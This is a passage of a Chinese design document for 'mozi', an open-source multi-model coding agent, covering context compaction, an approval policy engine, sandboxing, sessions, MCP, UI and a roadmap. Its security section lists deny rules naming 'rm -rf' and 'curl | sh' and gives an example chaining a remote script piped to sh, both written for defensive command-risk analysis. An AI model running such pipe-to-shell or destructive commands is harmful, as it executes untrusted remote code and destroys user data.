  | { type: 'usage'; usage: TokenUsage };
```

**容错**：参数 JSON 解析失败时，用「宽松修复」（去尾逗号、补引号）尝试一次，仍失败则把原始文本回填给模型要求修正——国产模型偶发格式抖动不能崩。

#### 4.4.4 模型分工（planner/executor）

- 开启后：用户输入先发给 planner（如 deepseek-reasoner）产出任务分解与工具序列草案 → 草案注入 executor 的 system 上下文；
- executor 失败 2 次后自动升级：把上下文交给 planner 复盘并修正方案；
- 纯粹的可选优化项，单模型模式是完全功能集。

### 4.5 上下文管理

#### 4.5.1 Token 预算模型（分层分配）

```
maxContextTokens（按模型能力自动获得，如 128k）
├── system prompt + 工具定义        ~8%（固定）
├── AGENTS.md 注入（全局/项目/目录）  ~4%（带截断保护）
├── 历史消息（可压缩区）              ~60%
└── 当前轮工作区（最近 N 轮 + 活跃文件）~28%
```

- 计数策略：优先用 provider 返回的真实 usage 校准；未返回时按 `chars / 3.5` 估算（中英混合经验值），误差通过安全余量（10%）吸收；
- 预算超限时按优先级裁剪：最老的轮次最先出列。

#### 4.5.2 自动压缩（Auto-Compact）

```
触发：当前上下文占用 ≥ 80% 预算
动作：把 [最老的 ~40% 轮次] 交给轻量模型总结为结构化摘要：
      {
        task: "用户原始诉求",
        done: ["已完成：修复了 auth.ts 的空指针", "新增 test/auth.test.ts"],
        pending: ["待验证：npm test 尚未通过"],
        keyFiles: ["src/auth.ts", "test/auth.test.ts"],
        keyDecisions: ["选择 JWT 方案而非 session"]
      }
替换：摘要 message 替换被压缩轮次，保留最近 5 轮原文 + 全部待审批项
事件：发出 context.compacted，UI 明确提示"已压缩 N 轮"
```

用户也可手动 `/compact`（带自定义摘要指令）。压缩前的完整事件日志仍在磁盘上，随时可回放——压缩只影响模型可见窗口，不丢数据。

#### 4.5.3 AGENTS.md 项目指令（分层加载，对齐 Codex/Claude Code 生态）

```
~/.mozi/AGENTS.md          # 用户全局偏好（语言习惯、代码风格）
<project-root>/AGENTS.md   # 项目约定（构建命令、测试命令、目录规范）
<project-root>/**/AGENTS.md # 子目录级（如 docs/、packages/sdk 各自的约定）
```

- 引擎在工具操作涉及某目录时按需注入对应层级（避免一次性灌入全树）；
- 兼容读取 `CLAUDE.md` / `GEMINI.md`（存在即读），降低存量用户迁移成本；
- 单文件注入上限 4k token，超出自动截断并提示。

#### 4.5.4 文件视图新鲜度

会话内维护「模型已读文件」缓存（`path → mtime + 内容摘要`）。当 `edit_file`/`shell` 修改了缓存中的文件，下一轮自动注入提示：「file X changed since last read」——避免模型基于过期内容继续推理（Codex 同款问题的工程解法）。

### 4.6 安全模型与沙箱

安全是 mozi 与玩具项目的分水岭，分四层防线：

#### 4.6.1 第一层：审批策略引擎（PolicyEngine）

三档基础模式 + 规则覆写（比 Codex 三档更细粒度）：

```ts
type PolicyMode = 'readonly' | 'auto' | 'full-auto';

interface PolicyConfig {
  mode: PolicyMode;
  rules: PolicyRule[];   // 优先级高于 mode 的默认行为
}

interface PolicyRule {
  match: {
    tool?: string;              // 'shell' | 'write_file' | ...
    commandPattern?: string;    // shell 专用：正则匹配命令
    pathGlob?: string;          // 文件类工具专用：如 ".env*"、"**/*.lock"
  };
  action: 'allow' | 'ask' | 'deny';
}
```

各模式默认行为：

| 工具 | readonly | auto（默认） | full-auto |
|------|----------|------------|-----------|
| read/grep/glob/list_dir | allow | allow | allow |
| write_file / edit_file | deny | allow | allow |
| shell（安全命令白名单） | deny | allow | allow |
| shell（其余命令） | deny | **ask** | allow（须沙箱 ≥ L2） |
| todo_list 等 meta | allow | allow | allow |

默认规则集内置（用户可增删）：

```jsonc
{ "rules": [
  { "match": { "tool": "shell", "commandPattern": "rm\\s+-rf|git push --force|curl.+\\|\\s*sh" }, "action": "deny" },
  { "match": { "tool": "shell", "commandPattern": "npm publish|git push" }, "action": "ask" },
  { "match": { "tool": "write_file", "pathGlob": "{.env*,**/secrets/**,**/*.pem}" }, "action": "ask" }
]}
```

#### 4.6.2 第二层：命令风险分析

`shell` 工具提交审批前，对命令做**结构化拆解**而非全文正则匹配：

```
输入: "npm test && curl https://x.sh | sh && git push"
拆解: [
  { cmd: 'npm test',   risk: 'safe'    },   ← 白名单（test/lint/build/ls/git status...）
  { cmd: 'curl ...',   risk: 'network' },   ← 外联
  { cmd: 'sh',         risk: 'pipe-exec' }, ← 管道执行远端脚本（高危）
  { cmd: 'git push',   risk: 'side-effect' }
]
综合: 取最高风险级 → deny/ask + 向用户展示拆解结果（可视化每一段风险）
```

实现：基于 shell 语法解析库（`tree-sitter-bash` 或简化 tokenizer）拆出 `&&`、`||`、`;`、`|` 分段，逐段匹配风险模式库。**UI 审批卡片必须显示拆解后的每段命令与风险标色**，让用户 3 秒内做出可靠判断。

#### 4.6.3 第三层：沙箱执行（四级）

| 级别 | 机制 | 平台 | 适用 |
|------|------|------|------|
| L0 | 无隔离（仅审批拦截） | 全平台 | 调试/信任环境 |
| L1 | 进程资源限制：超时、内存上限、子进程组回收 | 全平台 | 兜底基线（默认开启） |
| L2 | OS 沙箱：macOS Seatbelt / Linux Landlock+seccomp；Windows Job Object + 受限令牌 | 平台相关 | full-auto 最低要求 |
| L3 | 容器：Docker/Podman，workspace 只读或 diff-apply 挂载，网络白名单代理 | 全平台（需装 Docker） | 最高安全 / CI |

```
命令执行决策：
shell call → L3 可用且配置开启？ → 容器执行（结果与 diff 同步回真实目录）
         → 否则 L2 平台支持？    → OS 沙箱执行
         → 否则                  → L1 执行 + 策略引擎从严（exec 类一律 ask）
```

**网络管控**：L2/L3 下 shell 的网络出站经本地代理，按域名白名单放行（默认允许 npm registry / pip 等包管理源，`--allow-net` 增删）。

**Windows 说明**：Windows 无 Seatbelt 等价物，L2 实现为 Job Object（CPU/内存/进程数限制）+ 低完整性令牌；文档明确建议 Windows 用户的 full-auto 配合 Docker Desktop（L3）。这是平台现实，方案不假装它不存在。

#### 4.6.4 第四层：工作区边界（路径安全）

- 所有文件类工具经 `Workspace` 对象操作：根路径 = 启动目录（或 `--workspace` 指定）+ `.git` 仓库边界探测；
- 路径规范化后必须落在边界内；**symlink 解析后二次校验**（防符号链接逃逸）；
- 边界外访问 → 工具直接返回结构化错误提示模型「路径越界」；
- 会话中所有写入前快照到 `.mozi/snapshots/<session>/`（支持 `/undo` 整轮回滚），快照目录加 `.gitignore` 引导。

### 4.7 会话与持久化

```
~/.mozi/sessions/<sessionId>/
├── events.jsonl        # 事件日志（追加写，事件溯源主文件）
├── config.snapshot.json # 会话配置快照（resume 时校验）
└── snapshots/          # 写操作前文件快照（undo 用）
```

- **写入策略**：事件产生即 append（fsync 每 500ms 批量），崩溃最多丢最后半秒；
- **resume**：`mozi resume [sessionId]` → 重放 events.jsonl 折叠出 SessionState → 继续 `run()`。重放时 `message.delta` 等高频事件跳过（只折叠状态relevant事件），500ms 内恢复；
- **fork**：`mozi fork <sessionId> --at <eventIndex>` → 复制前 N 个事件为新会话；
- **会话列表**：`mozi sessions` 展示（时间、cwd、首条输入、token 消耗、模型）；
- **垃圾回收**：默认保留 30 天，可配置。

### 4.8 MCP 集成

```ts
// packages/mcp-client：stdio transport 起子进程，JSON-RPC 握手
const bridge = new McpBridge();
await bridge.connect({ command: 'npx', args: ['-y', '@modelcontextprotocol/server-github'] });

// MCP tools → AgentTool 协议桥接（含 JSON Schema 透传 + 工具名前缀防冲突）
registry.register(bridge.adapt());   // github__create_issue 等
```

- 桌面端提供 MCP Server 管理界面（增删/启停/查看工具列表与调用日志）；
- MCP 工具调用同样过 PolicyEngine（默认 `ask`，用户可按 server 粒度配置信任）；
- MCP 工具的 `display` 用通用 JSON 折叠卡片渲染（无原生 diff 语义）。

---

## 5. 交互层设计

### 5.1 CLI / TUI

**技术**：Ink（React for CLI）——声明式 TUI，组件化复用 React 生态与团队经验。

**界面分区**：

```
┌────────────────────────────────────────────────┐
│ ✻ mozi · deepseek-chat · auto · sandbox:L2     │ ← 状态栏（模型/模式/沙箱）
├────────────────────────────────────────────────┤
│ > 给登录页加上 remember me 功能                  │ ← 输入区（多行）
│                                                │
│ ── Turn ──────────────────────────────────     │
│ ◆ 思考: 先看下登录页结构...                     │ ← reasoning（灰色折叠）
│ ● read_file src/pages/Login.tsx (142 行)       │ ← 工具调用行
│ ● edit_file src/pages/Login.tsx  ✓ +12 -3      │ ← diff 摘要行
│ ⚠ shell: npm run test —— 需要批准               │ ← 审批卡片
│   [y 允许] [a 本次会话都允许] [n 拒绝] [e 展开详情] │
│ ✔ 完成：已添加记住我复选框，测试通过              │ ← 结论（绿色）
│                                                │
│ Tokens: 12.4k/128k · 工具 7 次 · ¥0.03         │ ← 用量条
└────────────────────────────────────────────────┘
```

**关键交互**：

| 操作 | 行为 |
|------|------|
| `Esc` | 中断当前 turn（原因回填模型） |
| `Ctrl+C` ×2 | 退出（进行中的会话已持久化，可 resume） |
| `/` 开头 | 斜杠命令：`/compact` `/undo` `/model` `/policy` `/resume` `/mcp` `/clear` |
| `@` 开头 | 文件引用补全：`@src/... ` 自动附为上下文 |
| `!` 开头 | 直通 shell（不经模型） |
| `Ctrl+T` | 切换审批模式（readonly/auto/full-auto 快捷轮换） |
| 图片粘贴 | 作为 vision 输入附给下一轮（能力探测通过时） |

**diff 渲染**：行内着色 + 语法高亮（`cli-highlight`），大 diff 折叠为摘要行（`+N -M`），回车展开。

**非交互模式**：`mozi exec "修复 failing test" --json`——事件流按行输出 NDJSON，退出码反映任务成败；`--policy full-auto --sandbox L3` 组合供 CI 使用；支持 `--allow-net`、`--timeout` 等参数。这是与 Codex exec 对齐的能力，也是被脚本/CI 集成的关键接口。

### 5.2 桌面应用

**技术**：Electron（主进程跑引擎）+ Vite + React + Tailwind + Zustand + Monaco Editor。

> 为什么 Electron 而非 Tauri：主进程需要原生 Node 环境（fs/child_process/Node SDK），Tauri 需 Rust sidecar 或 Node sidecar，链路更长；团队纯 TS 栈。协议层已隔离 UI 与引擎，未来若体积成为痛点可平滑迁 Tauri（见 ADR-006）。

**进程结构**：

```
Electron Main（Node.js）
 ├─ AgentService：每会话一个 AgentEngine 实例（并发会话管理）
 ├─ IpcBridge：engine 事件 → renderer（webContents.send），
 │              renderer 请求 → engine（ipcMain.handle）
 ├─ SessionVault：会话文件监听（多窗口共享）
 └─ autoUpdater（electron-updater，GitHub Releases 通道）
Renderer（React）
 ├─ 会话侧栏（多会话并行、resume、fork）
 ├─ 对话流（复用 CLI 的 DisplayPayload 渲染逻辑——同 DTO 不同 renderer）
 ├─ Diff 审阅器（Monaco DiffEditor，审批卡片内嵌，支持逐 hunk 批准）
 ├─ 计划面板（todo_list 可视化）
 ├─ 设置中心（模型/Provider/策略规则/MCP Server，全部 GUI 化）
 └─ 用量仪表盘（token/成本/工具调用统计，数据来自事件流）
```

**桌面端独有价值**（不是 CLI 的复制品）：

1. **逐 hunk diff 批准**——CLI 只能整体批准，桌面端 Monaco DiffEditor 支持选择应用部分改动；
2. **多会话并行管理**——多个任务窗口并发跑，事件流天然支持多订阅者；
3. **策略规则与 MCP 的 GUI 管理**——降低非终端用户的配置门槛；
4. **成本仪表盘**——事件流聚合出每会话/每日 token 与估算成本。

---

## 6. 工程结构与技术选型

### 6.1 Monorepo 目录结构

```
mozi/
├── package.json                 # pnpm workspace 根
├── pnpm-workspace.yaml
├── turbo.json                   # Turborepo 任务编排（build/test/lint 缓存）
├── tsconfig.base.json           # strict: true 全仓统一
├── .github/
│   ├── workflows/
│   │   ├── ci.yml               # lint + 单测 + 集成 + 依赖方向检查
│   │   ├── eval.yml             # 每日真实模型评测（自建基准）
│   │   └── release.yml          # changesets → npm + GitHub Releases + 桌面安装包
│   └── dependabot.yml
├── packages/
│   ├── shared/                  # 【零依赖】DTO：事件、请求、错误码、常量
│   │   └── src/{events,messages,policy-types}.ts
│   ├── core/                    # 引擎：AgentEngine / ContextManager / SessionStore
│   │   └── src/{engine,context,session}/...
│   ├── policy/                  # 审批策略引擎 + 命令风险分析
│   ├── tools/                   # 内置工具集 + PatchEngine
│   │   └── src/{read,write,edit,shell,grep,glob,todo}/...
│   │   └── src/descriptions/*.md  # 工具描述词（版本化）
│   ├── providers/               # LLM 适配（openai/anthropic/ollama + registry）
│   ├── sandbox/                 # 四级沙箱（platforms/{darwin,linux,win32,docker}）
│   ├── mcp-client/              # MCP 桥接
│   ├── config/                  # 分层配置加载与合并
│   ├── tui/                     # Ink 界面（被 cli 引用）
│   ├── protocol/                # 通道语义统一（IPC/进程内/WSS 三适配器，v1.4）
│   ├── relay-server/            # E2E 中继（自托管，零内容路由，v1.4）
│   └── desktop/                 # Electron 应用（main/ + renderer/）
├── apps/
│   ├── cli/                     # mozi 可执行入口（commander，薄壳，逻辑在 tui+core）
│   └── mobile/                  # Expo/RN 移动端（v1.4，复用 shared/protocol 类型）
├── benchmark/                   # 自建评测任务集（见 §8.3）
│   ├── tasks/                   # 每任务：{setup.sh, task.md, asserts/}
│   └── runner/
├── docs/                        # VitePress 文档站源码
├── examples/                    # 嵌入 @mozi/core 的示例（差异卖点演示）
│   └── embed-minimal/
└── .changeset/                  # 版本管理
```

**包依赖关系（dependency-cruiser 强制）**：

```
shared  ←  policy/tools/providers/sandbox/mcp-client/config/protocol  ←  core  ←  tui/desktop/relay-server/cli/mobile
                    （foundation 层）                  （engine 层）      （interface 层）
```

### 6.2 技术选型清单

| 领域 | 选型 | 版本基线 | 备注 |
|------|------|---------|------|
| 运行时 | Node.js | ≥ 20 LTS | 桌面端随 Electron 内置 |
| 语言 | TypeScript | 5.x，strict | 全仓统一 tsconfig.base |
| Monorepo | pnpm + Turborepo | 9 / 2.x | 任务缓存加速 CI |
| CLI 框架 | commander | 12 | 入口参数解析 |
| TUI | Ink + React | 5 / 18 | 声明式终端 UI |
| LLM SDK | openai（+自定义 baseURL）、@anthropic-ai/sdk | 最新稳定 | 覆盖 90% 端点 |
| 桌面 | Electron + Vite + React + Tailwind + Zustand | 33+ | 主进程跑引擎 |
| 代码编辑 | Monaco Editor | 0.5x | Diff 审阅器 |
| 移动端 | Expo（React Native）+ SQLCipher | SDK 52+ | 手机客户端（v1.4，复用 shared/protocol 类型） |
| 远程协议 | WSS + JSON-RPC 2.0 + NaCl box（E2E） | — | @mozi/protocol 三传输统一 |
| 持久化 | JSONL（自实现 append） | — | 不引入 SQLite，保持零原生依赖 |
| 测试 | vitest + @vitest/coverage | 2.x | 单测/集成统一 |
| E2E | Playwright | 1.4x | 桌面端 + TUI（spawn 断言） |
| Lint/Format | Biome | 1.x | 单工具替代 eslint+prettier，快 |
| 依赖治理 | dependency-cruiser | — | 分层规则 CI 强制 |
| 发布 | changesets + electron-builder + GitHub Releases | — | npm 包 + 桌面安装包 |
| 文档站 | VitePress | 1.x | docs.mozi.dev |

**零原生编译依赖原则**：所有 npm 包保持纯 JS/TS（不引 better-sqlite3、node-pty 等需 node-gyp 的依赖），保证 `npm i -g mozi` 在任何环境 10 秒装完。Windows shell 交互用内置 `child_process`（不依赖 ConPTY 包装层，接受无 PTY 交互的限制，完整 PTY 支持列入阶段二可选）。

### 6.3 关键决策记录（ADR 摘要）

| # | 决策 | 备选 | 选择理由 |
|---|------|------|---------|
| ADR-001 | TypeScript 而非 Rust | Rust（Codex 同款） | 开发效率、生态（LLM SDK/TUI 桌面全家桶）、团队栈；性能瓶颈在网络 IO 而非计算，Node 足够 |
| ADR-002 | 事件溯源而非状态快照 | SQLite 快照 | resume/fork/回放/多端同步/评测数据一次性解决；JSONL 调试友好 |
| ADR-003 | Ink 而非自绘 TUI | blessed / 自绘 | React 组件模型与桌面端共享心智；社区维护活跃 |
| ADR-004 | OpenAI 兼容协议为多模型基线 | 自定义抽象优先 | 市场事实标准，DeepSeek/Qwen/GLM/Ollama/vLLM 全兼容，适配成本最低 |
| ADR-005 | apply_patch 结构化编辑 | 全文重写 | token 成本低一个量级、大文件可靠性高；Codex 已验证该范式 |
| ADR-006 | Electron 而非 Tauri | Tauri 2 | 主进程需原生 Node；体积痛点未到；协议层隔离保留迁移路径 |
| ADR-007 | 引擎进程内直连优先，协议双形态 | 一律 C/S | CLI 零开销；DTO 序列化约束保证未来切换 WebSocket 零重构 |
| ADR-008 | 零原生依赖 | node-pty/SQLite | 全平台安装体验优先；能力缺口用降级方案补 |

---

## 7. 实施路线图

> 按里程碑推进，每个 M 有明确 DoD（Definition of Done）。M1 结束即获得「最小可用产品」。

### M0 —— 工程基建

**目标**：骨架立起来，CI 绿灯。

- pnpm workspace + Turborepo + tsconfig + Biome + vitest 全链路；
- `@mozi/shared` 事件与消息 DTO 定义完成（这是后续所有模块的契约）；
- dependency-cruiser 分层规则接入 CI；
- GitHub Actions：PR 跑 lint+test，主干跑 build；
- 文档站骨架（VitePress）上线。

**DoD**：`pnpm build && pnpm test && pnpm lint` 全绿；CI 强制分层规则；README 快速开始可跑通安装。

### M1 —— 引擎闭环（最小可用 Agent）

**目标**：终端里完成一次真实编码任务。

- AgentEngine 状态机 + 主循环（含中断、错误恢复）；
- Provider 层：OpenAI 兼容 + Anthropic，流式聚合 + 容错解析；
- 工具集：read_file / write_file / glob / grep / shell（L1 限制）；
- PolicyEngine 基础三档模式（无自定义规则）；
- ContextManager 基础版：固定预算裁剪 + AGENTS.md 注入（无自动压缩）；
- TUI 最小集：输入、流式输出、工具行、审批 y/n、Esc 中断；
- SessionStore：JSONL 持久化 + resume；
- `mozi exec --json` 非交互模式。

**DoD**：在真实仓库中完成 3 个标准任务（修一个 bug、加一个函数、写一个测试文件）；ScriptedProvider 集成测试覆盖 loop 全路径；resume 会话可继续对话。

### M2 —— 安全与编辑能力

**目标**：敢于在重要仓库使用。

- PatchEngine（apply_patch）+ fuzz 测试 + `/undo` 快照；
- 命令风险分析（结构化拆解）+ PolicyRule 自定义规则 + 审批卡片升级（命令分段风险着色）；
- 自动压缩（Auto-Compact）+ `/compact`；
- todo_list 计划工具 + TUI 计划面板；
- **子智能体编排 v1（详细设计 M12）**：task 工具 + 内置模板（explore/general/reviewer）+ 并发槽/深度控制 + 权限单调收紧 + 审批冒泡 + 子会话持久化；
- 文件新鲜度提示（mtime 失效检测）；
- TUI：diff 着色折叠、`@` 文件引用、`!` 直通 shell、斜杠命令补全。

**DoD**：自动压缩后任务连续性测试通过（压缩前后模型能续接任务）；patch 匹配 fuzz 1000 用例通过率 ≥ 99%；风险命令测试集全部正确拦截；**子智能体链路可用（explore 派发 → 摘要回传，主上下文增量 < 1k token；full-auto 会话中 explore 子 Agent 无法写文件）**。

### M3 —— 沙箱与生态

**目标**：full-auto 可用，生态可扩展。

- 沙箱 L2（Seatbelt / Landlock+seccomp / Job Object）+ L3（Docker）+ 网络代理白名单；
- **MCP v1（stdio + Tools）**：连接本地 MCP server，工具动态注册，三档信任管控；
- 会话 fork + 会话列表 + 30 天 GC；
- planner/executor 双模型分工（可选开启）；
- **子智能体 v2**：自定义模板（.mozi/agents/*.md + 兼容 .claude/agents/）与竞争模式（race，先完成者胜）；
- 图片输入（vision 能力协商）。

**DoD**：沙箱逃逸测试集（路径逃逸/symlink/进程提权/网络外联用例）全部拦截；接入 2 个第三方 MCP server 端到端跑通；full-auto + L3 在 benchmark 上完成任务。

### M3.5 —— MCP 完整客户端（v1.2 新增）

**目标**：从「能连 stdio server」升级为「完整 MCP 生态公民」。

- Streamable HTTP transport + OAuth 2.1（PKCE + safeStorage 令牌管理 + 自动刷新）；旧 HTTP+SSE 降级兼容；
- Resources：显式读取工具（mcp_read_resource）+ 订阅注入（uriPattern 匹配，预算控制）；
- Prompts：映射为 /mcp: 斜杠命令（含参数补全）；
- Sampling：默认 deny、白名单、审批冒泡、maxTokens 上限、子会话强制 deny；
- Elicitation：表单冒泡 + 频控；Roots / Progress / Logging / Cancellation 辅助能力；
- 桌面端 MCP 管理中心（添加向导/OAuth 授权窗口/能力浏览/权限编辑/调用日志）；
- mozi mcp 子命令族：list/test/restart/auth/resources/prompts。

**DoD**：接入 1 个 stdio server + 1 个需 OAuth 的远程 server 端到端跑通；sampling 未经授权无法调用；Prompt 内容注入位置断言（user 侧非 system）；双 transport 桩测试全绿；断线重连与熔断恢复验证。

### M4 —— 桌面应用

**目标**：桌面端达到日常可用。

- Electron 壳 + IpcBridge（复用全部引擎）；
- 会话侧栏、对话流、Monaco Diff 审阅（含逐 hunk 批准）、计划面板；
- 设置中心（模型/Provider/策略/MCP 全 GUI）+ 密钥安全存储（safeStorage）；
- 自动更新（electron-updater）+ 三平台安装包（dmg/nsis/AppImage）。

**DoD**：桌面与 CLI 同时打开同一会话，事件双向一致；Playwright E2E 覆盖核心链路；安装包签名（macOS 公证 + Windows）。

### M4.5 —— 定时任务与无人值守（v1.3 新增）

**目标**：从被动应答工具升级为自动化执行者。

- 调度核心：tick 架构（OS 每分钟唤醒 `mozi task tick` + 内部 cron-parser 求解；daemon 可选触发源，文件锁互斥）；三触发类型（cron 表达式含时区 / 固定间隔 / 一次性）；错过补跑策略（skip / catch-up-once / catch-up-all）；
- 无人值守安全模型：三档策略（readonly / allowlist 白名单 / full 强制容器沙箱）；ask 静态化为 deny（模型自纠）；成本上限 + 超时 + 连续失败≥3 自动停用；
- 产物隔离：git worktree 隔离执行 → branch / PR（gh）/ 报告 / direct（严格限制）四种产物策略；非 git 目录降级 patch 文件；
- 三层文件锁（tick 互斥 / 任务 overlap / direct 工作区与交互会话互斥）；
- 通知：桌面通知 + 通用 webhook JSON（接钉钉/飞书/Slack bot）；
- CLI 子命令族（task add/list/run/logs/doctor/gc + daemon）与桌面任务中心（创建向导/运行历史/diff 查看/事件回放）；
- 可复用 M12 模板作为任务人格（定时跑 reviewer 审查）。

**DoD**：`mozi task add --cron "*/5 * * * *"` 后 OS tick 驱动自动执行，产物落在 mozi/task/* 分支；ask 在无人值守下永不挂起（I1 不变式测试）；full+L2 任务创建被拒；电脑重启后错过触发按策略补跑；失败三次自动停用并通知。

### M4.75 —— 移动端与远程访问（v1.4 新增）

**目标**：手机成为一等客户端：远程下发任务、实时细节、审批推送、定时任务管理。

- 协议基础：`@mozi/protocol` 把 M10 IPC 通道语义升为通用协议，三传输适配器（进程内/Electron IPC/WSS）；移动端协议与桌面零分叉；
- 节点服务：`mozi serve`（headless）与桌面远程模式（同一引擎双路扇出）；LAN 直连（mDNS 发现 + 自签证书 pinning）与 E2E 自托管中继两种拓扑；
- 配对与信任：QR 配对（6 位码 5 分钟 TTL + 节点屏幕确认双因素）→ 设备注册表（吊销/轮换/权限档）；
- 设备权限模型：分级审批（high 风险默认手机不可批，需生物识别+冷静期才可放权）、策略修改默认禁止；
- 实时流：lastEventId 断线续传（复用 M7 事件日志重放）、delta 100ms 合并、附件按需分片拉取；
- 推送：零内容推送（只携带类型+会话 ID，唤醒后拉取）；PushGateway 可插拔（无/ntfy/FCM+APNs）；审批推送为最高优先级；
- 移动端应用（Expo/RN）：会话视图（流式/工具卡/diff/子智能体树）、审批收件箱、定时任务页、设备管理；离线只读缓存（SQLCipher）+ 指令排队（幂等键）；
- 中继服务器：零内容路由器 + 推送网关，Docker 自托管，E2E 下不可读不可伪造；
- M13 联动：无人值守任务的 ask 可选升级为手机审批（超时 5 分钟回落 deny）。

**DoD**：手机扫码配对后可下发任务并实时看到流式输出与 diff；审批推送到达并可一键批准（high 级被限制）；断网重连后事件不丢不重；中继日志扫描无明文；设备吊销后手机立即不可用；同 requestId 重试不重复执行。

### M4.9 —— 学习与扩展能力（v1.5 新增）

**目标**：让 Agent 越用越准、扩展不没天花板。

- 提示词工程（M15）：五层架构（基座/环境/能力/策略/任务）与组装管线；基座提示词全文定稿并版本化（promptHash 入会话）；**变更防护门禁**——prompt 改动 PR 强制跑 benchmark，成功率降 >5% 阻断；A/B 变体按会话哈希分桶；
- 记忆系统（M16）：三层记忆（用户/项目/语义检索）；确认制写入（半自动提取 + 下次会话确认入库，自动写入可选项）；去重/矛盾覆盖/LRU；信任分级（user-confirmed vs auto）与敏感内容拒写；纯 JS 向量检索 + BM25 降级（零原生依赖）；memory_write/search/forget 工具；
- 多模态（M17）：图片输入管线（格式/缩放/OCR 降级/能力协商拒绝）；screenshot 工具（全屏/窗口/浏览器三种目标，桌面 desktopCapturer、CLI 平台原生命令）；定时任务截图验证步骤（VerifyStep，vision 判定 pass/fail 入报告）；多模态评测任务组；
- Hooks（M18）：12 个钩子点（session/turn/tool/approval/compact/task 前后）；退出码语义（0 放行/2 阻断/其他 ask）+ onExit 映射；项目级 hooks 默认禁用 + 指纹确认（防恶意仓库投毒）；CI/headless 环境忽略项目级 hooks。

**DoD**：prompt 变更门禁在 CI 实际拦截一次注入的劣化变体；两轮会话记忆连续性任务通过（第一轮埋事实第二轮命中）；贴图修 UI 任务组成功率达标；恶意仓库 fixture 打开时 hooks 被拦截待确认、mozi exec 忽略之；改后自动 prettier 的示例 hook 端到端跑通。

### M5 —— 开源运营与评测体系

**目标**：成为可被信任的开源项目。

- `benchmark/` 30 任务评测集（见 §8.3）+ 每日 CI 跑分 + 官网公开趋势图；
- `examples/embed-minimal`（50 行代码嵌入引擎的演示，差异卖点的门面）；
- 完整文档站：快速开始 / 配置手册 / 工具扩展开发 / 引擎嵌入指南 / 安全模型白皮书；
- CONTRIBUTING / Code of Conduct / 语义化版本 + changesets 自动发布；
- 1.0.0 发布；
- **定时任务运营化**：任务模板库（内置审查/修复/扫描/评测预设）、任务状态页公开化（配合评测趋势）。

**DoD**：文档覆盖全部公开 API；新贡献者按文档 30 分钟内跑通本地开发；eval 每日跑分无中断 30 天。

---

## 8. 测试与质量保障

### 8.1 测试金字塔

```
        ▲  真实模型评测（30 任务，每日 CI，贵而少）
       ▲▲  E2E（Playwright：桌面端 / TUI spawn 断言）
      ▲▲▲  集成测试（ScriptedProvider 驱动完整 loop）
     ▲▲▲▲  单元测试（loop 状态机 / PatchEngine / PolicyEngine / 压缩器）
```

### 8.2 核心测试手段

**ScriptedProvider（确定性测试的关键）**：

```ts
// 录制真实模型的响应序列，离线回放驱动引擎
const provider = new ScriptedProvider([
  { toolCalls: [{ name: 'read_file', arguments: { path: 'src/a.ts' } }] },
  { toolCalls: [{ name: 'edit_file', arguments: { patch: '...' } }] },
  { content: '已完成修改' },
]);
// 断言：文件系统真实变化、事件序列、策略拦截、会话落盘
```

所有 loop 行为（审批流、中断、压缩触发、步数上限、失败重试）用 ScriptedProvider 写成确定性集成测试——不花一分钱 API 费、CI 秒级跑完。

**专项测试**：

- PatchEngine：fuzz（随机语料 → 随机变更 → 生成 patch → 断言结果等价预期）；
- 命令风险分析：危险命令对抗集（嵌套引号、base64 编码、多级管道、unicode 混淆）；
- 沙箱逃逸：路径穿越 / symlink 逃逸 / 子进程逃逸 / 网络外联探测；
- Provider 矩阵：每家模型 × {流式, 并行工具, 图片, 超长输出} 的契约测试（fixture 回放）。

### 8.3 自建评测集（benchmark/）

开源 Agent 的公信力来自可复现的跑分。任务分级：

| 级别 | 数量 | 示例 |
|------|------|------|
| L1 单点修改 | 10 | 「修复 utils/date.ts 中时区错误的测试」 |
| L2 跨文件功能 | 10 | 「给 API 加分页参数，含 schema、handler、测试」 |
| L3 调试型任务 | 5 | 「tests 全红，找到原因并修复（预埋 bug 的仓库）」 |
| L4 重构 | 5 | 「把 REST 客户端迁移到新 SDK，保持行为不变」 |

每任务 = `setup.sh`（准备仓库）+ `task.md`（自然语言指令）+ `asserts/`（文件断言 + 测试命令断言）。Runner 产出：成功率 / 平均步数 / token 成本 / 审批次数，按模型分列——这份「多模型 × 真实任务」跑分表本身就是社区稀缺品，也是 mozi 的获客内容。

---

## 9. 开源工程建设

| 事项 | 方案 |
|------|------|
| License | Apache-2.0（与 Codex/Gemini CLI 一致，商用友好） |
| 仓库治理 | trunk-based + PR 模板 + CODEOWNERS + 语义化提交 |
| 版本发布 | changesets 自动化：PR 打标签 → merge 后自动发 npm + GitHub Release |
| 桌面分发 | electron-builder：dmg（公证）/ nsis / AppImage + electron-updater 增量更新 |
| 安全策略 | SECURITY.md + 密钥只走环境变量（配置文件只存变量名）+ 依赖漏洞扫描（CI audit） |
| 社区 | Good First Issue 标签、RFC 流程（docs/rfcs/）、Discord/Discussions 双通道 |
| 文档站 | VitePress：指南、配置参考、API 参考（typedoc 生成）、安全白皮书 |
| 品牌 | 名字已定（墨子/Mozi）；待办：Logo 终版设计、域名（mozi.dev 等）与 npm scope（@mozi/*）注册占位 |

**冷启动策略**：M1 发布后立即发 Reddit（r/LocalLLaMA、r/ChatGPTCoding）+ V2EX + 掘金，主打「多模型开源编码 Agent + 引擎可嵌入」；M5 用评测跑分表做二次传播。

---

## 10. 风险评估与应对

| # | 风险 | 概率 | 影响 | 应对 |
|---|------|------|------|------|
| R1 | 各家模型 tool-calling 质量参差（尤其流式参数分片与 JSON 格式抖动） | 高 | 高 | Provider 矩阵契约测试 + 宽松 JSON 修复 + 失败回填重试；评测集持续暴露坏模型并公示 |
| R2 | Windows 缺少成熟 OS 沙箱 | 高 | 中 | L1 Job Object 兜底 + 文档引导 Docker（L3）；full-auto 在 Windows 上默认降级为 ask 策略 |
| R3 | 上下文管理复杂度失控（压缩导致任务断裂） | 中 | 高 | 压缩保留结构化摘要模板 + 活跃文件视图；评测集 L2/L3 任务专门验证压缩连续性；压缩阈值可调可关 |
| R4 | apply_patch 匹配鲁棒性不足 | 中 | 中 | fuzz 测试前置（M2 DoD 硬指标）；匹配失败给模型高信息量错误引导重生 |
| R5 | Electron 包体积与内存 | 中 | 低 | 主进程按需创建引擎实例；ADR-006 保留 Tauri 迁移路径（协议层已隔离） |
| R6 | 与 Codex/Claude Code 生态兼容负担（AGENTS.md 等约定漂移） | 低 | 中 | 只读兼容（CLAUDE.md/GEMINI.md），自家扩展走独立命名空间；跟随上游变更在 NEWS 中公告 |
